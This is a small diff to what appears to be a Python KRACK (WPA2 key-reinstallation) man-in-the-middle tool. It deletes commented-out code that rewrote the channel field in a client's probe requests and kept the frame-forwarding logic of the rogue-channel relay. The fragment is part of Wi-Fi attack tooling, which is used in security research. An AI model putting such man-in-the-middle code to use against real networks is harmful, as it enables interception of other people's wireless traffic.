@@ -479,11 +479,6 @@ class KRAckAttack():
 				will_forward = True
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				# if (p.haslayer(Dot11ProbeReq)):
-				# 	ds_parameter_set_index = p.payload.fields_desc[2].find("DSset")
-				# 	ds_parameter_set_start = p.payload.fields_desc[2].fmt.find("B", ds_parameter_set_index)
-				# 	p.payload.load[ds_parameter_set_start + 1] = self.netconfig.real_channel
-				# 	self.sock_real.send(p, True, self.netconfig.real_channel)
 				print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
